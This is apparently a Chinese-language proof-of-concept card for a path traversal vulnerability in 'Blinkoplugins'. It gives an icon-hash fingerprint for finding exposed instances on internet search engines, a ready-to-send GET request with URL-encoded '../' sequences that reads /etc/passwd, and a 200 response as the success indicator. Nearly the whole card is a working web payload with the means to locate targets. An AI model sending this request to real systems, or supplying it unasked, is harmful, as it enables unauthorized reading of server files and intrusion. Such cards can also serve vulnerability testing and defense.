# Blinkoplugins存在路径穿越漏洞

Blinkoplugins ｜ 路径遍历 ｜ —
- **指纹**：`icon_hash="-1446811182"`
- **请求**：`GET /plugins/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1`
- **响应特征**：200